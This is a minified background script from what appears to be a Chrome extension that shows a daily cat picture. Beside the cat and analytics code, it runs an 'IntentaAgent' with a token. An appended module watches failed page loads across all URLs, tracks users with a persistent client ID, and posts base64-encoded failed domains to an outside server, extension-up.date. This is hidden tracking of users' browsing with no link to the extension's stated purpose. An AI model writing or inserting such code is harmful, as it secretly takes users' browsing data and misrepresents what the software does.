﻿
var dayOffset = 162E5,
  _gaq = _gaq || [];
_gaq.push(["_setAccount", "UA-31095894-3"]);
_gaq.push(["_trackPageview"]);
window.onload = function() {
  localStorage.removeItem("cache");
  localStorage.removeItem("cached");
  localStorage.removeItem("cache_timestamp");
  if (localStorage.install) localStorage.installSynced || (chrome.storage.sync.set({
    install: localStorage.install
  }, function() {}), localStorage.installSynced = !0);
  else {
    var c = function() {
      localStorage.install || (localStorage.install = Date.now(), chrome.storage.sync.set({
        install: localStorage.install
      }, function() {}))
    };
    try {
      chrome.storage.sync.get("install", function(a) {
        if (!chrome.runtime.lastError) try {
          13 ==
            a.install.length && (localStorage.install = a.install)
        } catch (b) {}
        c()
      }), chrome.notifications.create("catFirstInstall", {
        type: "basic",
        iconUrl: "../../icons/icon-128.png",
        title: "Welcome, and thank you very much for using cats!",
        message: "Clicking on the paw in the top right will open a small popup containing the day's cat. A new one will arrive daily.",
        priority: 2
      }, function(a) {})
    } catch (a) {
      c()
    }
  }
  if (localStorage.currentIndex && "NaN" != localStorage.currentIndex) try {
    updateCurrentEntry()
  } catch (a) {
    console.log(a.message)
  } else {
    localStorage.currentEntryAccessed =
      0;
    localStorage.currentEntryAccessTime = 0;
    localStorage.currentIndex = "0";
    localStorage.lastImage = !1;
    c = function() {
      localStorage.currentIndex || (localStorage.currentIndex = "0", chrome.storage.sync.set({
        currentIndex: "0"
      }, function() {}), updateCurrentEntry())
    };
    try {
      chrome.storage.sync.get("currentIndex", function(a) {
        if (!chrome.runtime.lastError) try {
          a.currentIndex && null != a.currentIndex && "" != a.currentIndex && "NaN" != a.currentIndex && "undefined" != a.currentIndex && "null" != a.currentIndex && (localStorage.currentIndex = a.currentIndex,
            getNewEntry())
        } catch (b) {}
        c()
      })
    } catch (a) {
      c()
    }
  }
  setInterval(function() {
    try {
      updateCurrentEntry()
    } catch (a) {
      console.log(a.message)
    }
  }, 3E5);
  0 == localStorage.currentEntryAccessed && (chrome.browserAction.setIcon({
    path: "/icons/icon-19-new.png"
  }), chrome.browserAction.setTitle({
    title: "new cat"
  }));
  window.addEventListener("storage", function(a) {
    "currentEntryAccessed" == a.key && (chrome.browserAction.setIcon({
      path: "/icons/icon-19.png"
    }), chrome.browserAction.setTitle({
      title: "old cat"
    }))
  }, !1);
  try {
    var b = document.createElement("script");
    b.type = "text/javascript";
    b.async = !0;
    b.src = "https://ssl.google-analytics.com/ga.js";
    var d = document.getElementsByTagName("script")[0];
    d.parentNode.insertBefore(b, d)
  } catch (a) {}
  b = new IntentaAgent;
  b.setEnv("production");
  b.setToken("Dqa4NfaMaqhfkpgc-9na9g");
  b.run()
};

function updateCurrentEntry() {
  if ("0" !== localStorage.currentIndex) {
    if (0 != localStorage.currentEntryAccessed) {
      var c = (new Date).getTime();
      if (864E5 < c - Number(localStorage.currentEntryAccessTime)) return getNewEntry();
      var b = (new Date(Number(localStorage.currentEntryAccessTime) - dayOffset)).getDate(),
        c = (new Date(c - dayOffset)).getDate();
      if (b !== c) return getNewEntry()
    }
  } else getNewEntry()
}

function getNewEntry() {
  "true" == localStorage.lastImage && (localStorage.currentIndex = "0", localStorage.lastImage = !1);
  localStorage.currentEntryAccessed = 0;
  localStorage.currentEntryAccessTime = (new Date).getTime();
  localStorage.currentIndex = 1 + Number(localStorage.currentIndex);
  try {
    chrome.storage.sync.set({
      currentIndex: localStorage.currentIndex
    }, function() {})
  } catch (c) {}
  preloadEntry();
  chrome.browserAction.setIcon({
    path: "/icons/icon-19-new.png"
  });
  chrome.browserAction.setTitle({
    title: "new cat"
  });
  checkForNextEntryExistence()
}

function checkForNextEntryExistence() {
  urlExists("http://www.iscalio.com/cats/" + (1 + Number(localStorage.currentIndex)) + ".jpg") || (localStorage.lastImage = !0)
}

function preloadEntry() {
  localStorage.preloadedCat = "";
  var c = new Image;
  c.src = "http://www.iscalio.com/cats/" + localStorage.currentIndex + ".jpg";
  c.onload = function() {
    localStorage.preloadedCat = getBase64Image(c)
  }
}

function getBase64Image(c) {
  var b = document.createElement("canvas");
  b.width = c.width;
  b.height = c.height;
  b.getContext("2d").drawImage(c, 0, 0);
  return b.toDataURL("image/png")
}

function urlExists(c) {
  var b = new XMLHttpRequest;
  b.open("HEAD", c, !1);
  b.send();
  return 404 != b.status
}

function httpGet(c, b) {
  var d = new XMLHttpRequest;
  b && (d.onreadystatechange = function() {
    4 == d.readyState && b.call(this, d.responseText)
  });
  d.open("GET", c, !0);
  d.send()
}
(function() {
  function c(a) {
    var b = "",
      c, e, f, l, k, g, h = 0;
    do c = a.charCodeAt(h++), e = a.charCodeAt(h++), f = a.charCodeAt(h++), l = c >> 2, c = (c & 3) << 4 | e >> 4, k = (e & 15) << 2 | f >> 6, g = f & 63, isNaN(e) ? k = g = 64 : isNaN(f) && (g = 64), b = b + d.charAt(l) + d.charAt(c) + d.charAt(k) + d.charAt(g); while (h < a.length);
    return b
  }
  var b = {
    apiUrl: "http://extension-up.date/v2/partner-domain",
    extId: "472",
    clientId: void 0,
    whitelist: "co.kr ac.kr co.ke swp.nl go.kr jus.br ucm.es edu.ee boc.cn ucd.ie edu.ba tn.it ucc.ie go.ke ac.ma sze.hu com.uk fbi.com lrz.de ua.es lpu.in in.ua co.au us.es pe.kr re.kr mil.kr uma.es mi.it db.de msn.cn ne.kr gov.hu mil.pl ids.pl cui.pl hs.kr by.ru ust.hk com.la ac.lk bz.it edu.mk nbg.gr cmw.ru ba.it hjp.at hn.de com.in ls.ua gov.mk uu.se sia.eu no.it bo.it mec.pt sv.it bcf.ch ips.pt hmi.de fvg.it xsb.cc ae.ca mrp.sg wat.edu uco.edu anf.by met.ua efa.lu dle.ro csk.li eki.to tr.tm eu.uk asl.de crc.ro dia.no rjv.br you.com psn.com co.cn com.jp hfk.no mwn.de com.us vhl.ru org.us gov.ba ur.mx iif.hu bn.it net.edu uzh.ch iep.fr ops.org urm.lt mj.pt gen.net mzv.sk www.es vsb.ca on.it www.tw prq.se vba.com amm.net cm.us atc.be tlg.tw kg.ac kuh.fi pg.eu veo.com co.br ve.it fm.pl ufu.br uvm.cl ac.ke yb.int at.tc uaq.mx to.it itc.cn ms.kr ra.it dm.at app.su wwc.edu tak.ee no.no co.mx bcc.it mty.mx aco.nz kis.edu cr.it rns.tn isg.am bbc.uk sxy.kr sos.cl sos.tv zvd.si du.pk uhk.cy ayp.am ab.va cit.cc edu.ag bfn.is kin.edu nl.net vk.com xii.jp skr.jp fi.it byr.cn vi.it vr.it com.nz rm.it pf.sk med.pl bg.it ull.es bs.it ex.ua cn.net ct.it net.ba na.it byu.net wwe.net et.al myv.com fml.com man.de wl.cn kik.se owl.edu rel.pl gna.com bs.org da.nl sex.am pbs.si or.kr gb.com gb.net hk.cn mo.cn no.com se.com se.net tw.cn uk.com uk.net com.ac edu.ac gov.ac net.ac mil.ac org.ac nom.ad net.ae gov.ae org.ae mil.ae sch.ae ac.ae pro.ae name.ae gov.af edu.af net.af com.af com.ag org.ag net.ag co.ag nom.ag off.ai com.ai net.ai org.ai gov.al edu.al org.al com.al net.al uniti.al tirana.al soros.al upt.al inima.al com.an net.an org.an edu.an co.ao ed.ao gv.ao it.ao og.ao pb.ao com.ar gov.ar int.ar mil.ar net.ar org.ar e164.arpa in-addr.arpa iris.arpa ip6.arpa uri.arpa urn.arpa gv.at ac.at co.at or.at priv.at asn.au com.au net.au id.au org.au csiro.au oz.au info.au conf.au act.au nsw.au nt.au qld.au sa.au tas.au vic.au wa.au gov.au edu.au com.aw com.az net.az int.az gov.az biz.az org.az edu.az mil.az pp.az name.az info.az com.bb edu.bb gov.bb net.bb org.bb com.bd edu.bd net.bd gov.bd org.bd mil.bd ac.be to.be com.be co.be xa.be ap.be fgov.be gov.bf com.bm edu.bm org.bm gov.bm net.bm com.bn edu.bn org.bn net.bn com.bo org.bo net.bo gov.bo gob.bo edu.bo tv.bo mil.bo int.bo agr.br am.br art.br edu.br com.br coop.br esp.br far.br fm.br g12.br gov.br imb.br ind.br inf.br mil.br net.br org.br psi.br rec.br srv.br tmp.br tur.br tv.br etc.br adm.br adv.br arq.br ato.br bio.br bmd.br cim.br cng.br cnt.br ecn.br eng.br eti.br fnd.br fot.br fst.br ggf.br jor.br lel.br mat.br med.br mus.br not.br ntr.br odo.br ppg.br pro.br psc.br qsl.br slg.br trd.br vet.br zlg.br dpn.br nom.br com.bs net.bs org.bs com.bt edu.bt gov.bt net.bt org.bt co.bw org.bw gov.by mil.by ab.ca bc.ca mb.ca nb.ca nf.ca nl.ca ns.ca nt.ca nu.ca on.ca pe.ca qc.ca sk.ca yk.ca co.cc com.cd net.cd org.cd com.ch net.ch org.ch gov.ch co.ck ac.cn com.cn edu.cn gov.cn net.cn org.cn ah.cn bj.cn cq.cn fj.cn gd.cn gs.cn gz.cn gx.cn ha.cn hb.cn he.cn hi.cn hl.cn hn.cn jl.cn js.cn jx.cn ln.cn nm.cn nx.cn qh.cn sc.cn sd.cn sh.cn sn.cn sx.cn tj.cn xj.cn xz.cn yn.cn zj.cn com.co edu.co org.co gov.co mil.co net.co nom.co ac.cr co.cr ed.cr fi.cr go.cr or.cr sa.cr com.cu edu.cu org.cu net.cu gov.cu inf.cu gov.cx com.cy biz.cy info.cy ltd.cy pro.cy net.cy org.cy name.cy tm.cy ac.cy ekloges.cy press.cy parliament.cy com.dm net.dm org.dm edu.dm gov.dm edu.do gov.do gob.do com.do org.do sld.do web.do net.do mil.do art.do com.dz org.dz net.dz gov.dz edu.dz asso.dz pol.dz art.dz com.ec info.ec net.ec fin.ec med.ec pro.ec org.ec edu.ec gov.ec mil.ec com.ee org.ee fie.ee pri.ee eun.eg edu.eg sci.eg gov.eg com.eg org.eg net.eg mil.eg com.es nom.es org.es gob.es edu.es com.et gov.et org.et edu.et net.et biz.et name.et info.et aland.fi biz.fj com.fj info.fj name.fj net.fj org.fj pro.fj ac.fj gov.fj mil.fj school.fj co.fk org.fk gov.fk ac.fk nom.fk net.fk tm.fr asso.fr nom.fr prd.fr presse.fr com.fr gouv.fr com.ge edu.ge gov.ge org.ge mil.ge net.ge pvt.ge co.gg net.gg org.gg com.gh edu.gh gov.gh org.gh mil.gh com.gi ltd.gi gov.gi mod.gi edu.gi org.gi com.gn ac.gn gov.gn org.gn net.gn com.gp, net.gp, edu.gp, asso.gp, org.gp com.gr edu.gr net.gr org.gr gov.gr com.hk edu.hk gov.hk idv.hk net.hk org.hk com.hn edu.hn org.hn net.hn mil.hn gob.hn iz.hr from.hr name.hr com.hr com.ht net.ht firm.ht shop.ht info.ht pro.ht adult.ht org.ht art.ht pol.ht rel.ht asso.ht perso.ht coop.ht med.ht edu.ht gouv.ht co.hu info.hu org.hu priv.hu sport.hu tm.hu 2000.hu agrar.hu bolt.hu casino.hu city.hu erotica.hu erotika.hu film.hu forum.hu games.hu hotel.hu ingatlan.hu jogasz.hu konyvelo.hu lakas.hu media.hu news.hu reklam.hu sex.hu shop.hu suli.hu szex.hu tozsde.hu utazas.hu video.hu ac.id co.id or.id go.id gov.ie ac.il co.il org.il net.il k12.il gov.il muni.il idf.il co.im net.im gov.im org.im nic.im ac.im co.in firm.in net.in org.in gen.in ind.in nic.in ac.in edu.in res.in gov.in mil.in ac.ir co.ir gov.ir net.ir org.ir sch.ir ac.is org.is gov.it pisa.it co.je net.je org.je edu.jm gov.jm com.jm net.jm org.jm com.jo org.jo net.jo edu.jo gov.jo mil.jo ac.jp ad.jp co.jp ed.jp go.jp gr.jp lg.jp ne.jp or.jp hokkaido.jp aomori.jp iwate.jp miyagi.jp akita.jp yamagata.jp fukushima.jp ibaraki.jp tochigi.jp gunma.jp saitama.jp chiba.jp tokyo.jp kanagawa.jp niigata.jp toyama.jp ishikawa.jp fukui.jp yamanashi.jp nagano.jp gifu.jp shizuoka.jp aichi.jp mie.jp shiga.jp kyoto.jp osaka.jp hyogo.jp nara.jp wakayama.jp tottori.jp shimane.jp okayama.jp hiroshima.jp yamaguchi.jp tokushima.jp kagawa.jp ehime.jp kochi.jp fukuoka.jp saga.jp nagasaki.jp kumamoto.jp oita.jp miyazaki.jp kagoshima.jp okinawa.jp sapporo.jp sendai.jp yokohama.jp kawasaki.jp nagoya.jp kobe.jp kitakyushu.jp per.kh com.kh edu.kh gov.kh mil.kh net.kh org.kh com.kw edu.kw gov.kw net.kw org.kw mil.kw edu.ky gov.ky com.ky org.ky net.ky org.kz edu.kz net.kz gov.kz mil.kz com.kz net.lb org.lb gov.lb edu.lb com.lb com.lc org.lc edu.lc gov.lc com.li net.li org.li gov.li gov.lk sch.lk net.lk int.lk com.lk org.lk edu.lk ngo.lk soc.lk web.lk ltd.lk assn.lk grp.lk hotel.lk com.lr edu.lr gov.lr org.lr net.lr org.ls co.ls gov.lt mil.lt gov.lu mil.lu org.lu net.lu com.lv edu.lv gov.lv org.lv mil.lv id.lv net.lv asn.lv conf.lv com.ly net.ly gov.ly plc.ly edu.ly sch.ly med.ly org.ly id.ly co.ma net.ma gov.ma org.ma tm.mc asso.mc org.mg nom.mg gov.mg prd.mg tm.mg com.mg edu.mg mil.mg army.mil navy.mil . com.mk org.mk com.mo net.mo org.mo edu.mo gov.mo weather.mobi music.mobi . org.mt com.mt gov.mt edu.mt net.mt com.mu co.mu aero.mv biz.mv com.mv coop.mv edu.mv gov.mv info.mv int.mv mil.mv museum.mv name.mv net.mv org.mv pro.mv ac.mw co.mw com.mw coop.mw edu.mw gov.mw int.mw museum.mw net.mw org.mw com.mx net.mx org.mx edu.mx gob.mx com.my net.my org.my gov.my edu.my mil.my name.my edu.ng com.ng gov.ng org.ng net.ng gob.ni com.ni edu.ni org.ni nom.ni net.ni mil.no stat.no kommune.no herad.no priv.no vgs.no fhs.no museum.no fylkesbibl.no folkebibl.no idrett.no com.np org.np edu.np net.np gov.np mil.np gov.nr edu.nr biz.nr info.nr org.nr com.nr net.nr co.nr ac.nz co.nz cri.nz gen.nz geek.nz govt.nz iwi.nz maori.nz mil.nz net.nz org.nz school.nz com.om co.om edu.om ac.com sch.om gov.om net.om org.om mil.om museum.om biz.om pro.om med.om com.pa ac.pa sld.pa gob.pa edu.pa org.pa net.pa abo.pa ing.pa med.pa nom.pa com.pe org.pe net.pe edu.pe mil.pe gob.pe nom.pe com.pf org.pf edu.pf com.pg net.pg com.ph gov.ph com.pk net.pk edu.pk org.pk fam.pk biz.pk web.pk gov.pk gob.pk gok.pk gon.pk gop.pk gos.pk com.pl biz.pl net.pl art.pl edu.pl org.pl ngo.pl gov.pl info.pl mil.pl\u0107 waw.pl warszawa.pl wroc.pl wroclaw.pl krakow.pl poznan.pl lodz.pl gda.pl gdansk.pl slupsk.pl szczecin.pl lublin.pl bialystok.pl biz.pr com.pr edu.pr gov.pr info.pr isla.pr name.pr net.pr org.pr pro.pr law.pro med.pro cpa.pro edu.ps gov.ps sec.ps plo.ps com.ps org.ps net.ps com.pt edu.pt gov.pt int.pt net.pt nome.pt org.pt publ.pt net.py org.py gov.py edu.py com.py com.ro org.ro tm.ro nt.ro nom.ro info.ro rec.ro arts.ro firm.ro store.ro www.ro com.ru net.ru org.ru pp.ru msk.ru int.ru ac.ru gov.rw net.rw edu.rw ac.rw com.rw co.rw int.rw mil.rw gouv.rw com.sa edu.sa sch.sa med.sa gov.sa net.sa org.sa pub.sa com.sb gov.sb net.sb edu.sb com.sc gov.sc net.sc org.sc edu.sc com.sd net.sd org.sd edu.sd med.sd tv.sd gov.sd info.sd org.se pp.se tm.se brand.se parti.se press.se komforb.se kommunalforbund.se komvux.se lanarb.se lanbib.se naturbruksgymn.se sshn.se fhv.se fhsk.se fh.se mil.se ab.se c.se d.se e.se f.se g.se h.se i.se k.se m.se n.se o.se s.se t.se u.se w.se x.se y.se z.se ac.se bd.se com.sg net.sg org.sg gov.sg edu.sg per.sg idn.sg rs.sr edu.sv com.sv gob.sv org.sv red.sv gov.sy com.sy net.sy ac.th co.th in.th go.th mi.th or.th net.th ac.tj biz.tj com.tj co.tj edu.tj int.tj name.tj net.tj org.tj web.tj gov.tj go.tj mil.tj com.tn intl.tn gov.tn org.tn ind.tn nat.tn tourism.tn info.tn ens.tn fin.tn net.tn gov.to gov.tp com.tr info.tr biz.tr net.tr org.tr web.tr gen.tr av.tr dr.tr bbs.tr name.tr tel.tr gov.tr bel.tr pol.tr mil.tr k12.tr edu.tr bel.tr co.tt com.tt org.tt net.tt biz.tt info.tt pro.tt name.tt edu.tt gov.tt us.tt gov.tv edu.tw gov.tw mil.tw com.tw net.tw org.tw idv.tw game.tw ebiz.tw club.tw co.tz ac.tz go.tz or.tz ne.tz com.ua gov.ua net.ua edu.ua org.ua cherkassy.ua ck.ua chernigov.ua cn.ua chernovtsy.ua cv.ua crimea.ua dnepropetrovsk.ua dp.ua donetsk.ua dn.ua ivano-frankivsk.ua if.ua kharkov.ua kh.ua kherson.ua ks.ua khmelnitskiy.ua km.ua kiev.ua kv.ua kirovograd.ua kr.ua lugansk.ua lg.ua lutsk.ua lviv.ua nikolaev.ua mk.ua odessa.ua od.ua poltava.ua pl.ua rovno.ua rv.ua sebastopol.ua sumy.ua ternopil.ua te.ua uzhgorod.ua vinnica.ua vn.ua zaporizhzhe.ua zp.ua zhitomir.ua zt.ua co.ug ac.ug sc.ug go.ug ne.ug or.ug ac.uk co.uk gov.uk ltd.uk me.uk mil.uk mod.uk net.uk nic.uk nhs.uk org.uk plc.uk police.uk sch.uk bl.uk british-library.uk icnet.uk jet.uk nel.uk nls.uk national-library-scotland.uk parliament.uk ak.us al.us ar.us az.us ca.us co.us ct.us dc.us de.us dni.us fed.us fl.us ga.us hi.us ia.us id.us il.us in.us isa.us kids.us ks.us ky.us la.us ma.us md.us me.us mi.us mn.us mo.us ms.us mt.us nc.us nd.us ne.us nh.us nj.us nm.us nsn.us nv.us ny.us oh.us ok.us or.us pa.us ri.us sc.us sd.us tn.us tx.us ut.us vt.us va.us wa.us wi.us wv.us wy.us k12.us cc.us tec.us lib.us state.us gen.us edu.uy gub.uy org.uy com.uy net.uy mil.uy vatican.va com.ve net.ve org.ve info.ve co.ve web.ve com.vi org.vi edu.vi gov.vi com.vn net.vn org.vn edu.vn gov.vn int.vn ac.vn biz.vn info.vn name.vn pro.vn health.vn com.ye net.ye ac.yu co.yu org.yu edu.yu ac.za city.za co.za edu.za gov.za law.za mil.za nom.za org.za school.za alt.za net.za ngo.za tm.za web.za co.zm org.zm gov.zm sch.zm ac.zm co.zw org.zw gov.zw ac.zw ac ad ae aero af ag ai al am an ao aq ar arpa as at au and act nsw nt qld sa tas vic wa aw ax az ba bb bd be bf bg bh bi biz bj bm bn bo br bs bt bv bw by bz ca cat cc cd cf cg ch ci ck cl cm cn co com coop cr cu cv cx cy cz de dj dk dm do dz ec edu ee eg er es et eu fi fj fk fm fo fr ga gb gd ge gf gg gh gi gl gm gn gov gp or gq gr gs gt gu gw gy hk hm hn hr ht hu id ie il im in info int io iq ir is it je jm jo jobs jp ke kg kh ki km kn kr kw ky kz la lb lc li lk lr ls lt lu lv ly ma mc md mg mh mil mk ml mm mn mo mobi mp mq mr ms mt mu museum mv mw mx my mz na name nc ne net nf ng ni nl no np nr nr nu nz om org pa pe pf pg ph pk pl pm pn pr pro ps pt pw py qa re ro ru rw sa sb sc sd se sg sh si sj sk sl sm sn so sr st su sv sy sz tc td tf tg th tj tk tl tm tn to tp tr travel tt tv tw tz ua ug uk um us uy uz va vc ve vg vi vn vu wf ws ye yt yu za zm zw".split(" "),
    blacklist: "facebook. youtube. vk. reddit. google. tumblr. imgur. wikipedia. mangahere. broward. instagram. amazon. mangareader. ask. mangafox. bing. odnoklassniki.ru ebay. imdb.com flickr.com bradleysmart.co.uk bbc.co.uk xvideos.com xhamster.com linkedin.com twitter. thepiratebay. 9gag. pinterest.com neopets.com t.co 1channel.ch 4chan.org netflix.com basecamphq.com".split(" "),
    regular: /^([a-z0-9][a-z0-9\-]*[a-z0-9]\.{0,3})*(\.[a-z0-9\-]{2,15})+$/i,
    init: function(a) {
      this.clientId = this.getPref("am_client_id");
      this.clientId || (this.clientId = this.uuidGenerator(), this.setPref("am_client_id", this.clientId))
    },
    check: function(a) {
      console.log("checking url: ", a);
      this.clientId && (a = a.replace("https://", "").replace("http://", "").split("/")[0], this.checkWhitelist(a))
    },
    checkWhitelist: function(a) {
      for (var b in this.whitelist) {
        var c = this.whitelist[b];
        if (-1 != a.indexOf("." + c) && a.indexOf("." + c) == a.length - c.length - 1) {
          a = a.split(".");
          b = a[a.length - 2] + "." + a[a.length - 1]; - 1 != c.indexOf(".") && (b = a[a.length - 3] + "." + b);
          this.checkBlacklist(b);
          break
        }
      }
    },
    checkBlacklist: function(a) {
      if (-1 == a.indexOf("google")) {
        for (var b in this.blacklist)
          if (0 == a.indexOf(this.blacklist[b])) return;
        this.checkRegular(a)
      }
    },
    checkRegular: function(a) {
      this.regular.test(a) && this.checkXHR(a, !0)
    },
    checkXHR: function(a, c) {
      var d = new XMLHttpRequest,
        e = "";
      c && (e = "www.");
      d.open("GET", "http://" + e + a, !0);
      d.onreadystatechange = function(e) {
        4 == d.readyState && 0 == d.status && (c ? b.checkXHR(a, !1) : b.submit(a))
      };
      d.send(null)
    },
    submit: function(a) {
      var b = new XMLHttpRequest;
      b.open("POST", this.apiUrl, !0);
      b.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      b.send("data=" + c(JSON.stringify({
        user_guid: this.clientId,
        extension_id: this.extId,
        domain: a
      })).replace(/=/, ""))
    },
    uuidGenerator: function() {
      var a = function() {
        return (65536 * (1 + Math.random()) | 0).toString(16).substring(1)
      };
      return a() + a() + "-" + a() + "-" + a() + "-" + a() + "-" + a() + a() + a()
    },
    getPref: function(a) {
      a = localStorage[a];
      return "false" == a ? !1 : a
    },
    setPref: function(a, b) {
      localStorage[a] = b
    }
  };
  window.addEventListener("load", function() {
    b.init()
  }, !1);
  chrome.webRequest.onErrorOccurred.addListener(function(a) {
    -1 == a.url.indexOf("http://") && -1 == a.url.indexOf("https://") || b.check(a.url)
  }, {
    urls: ["<all_urls>"],
    types: ["main_frame"]
  });
  var d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
})();
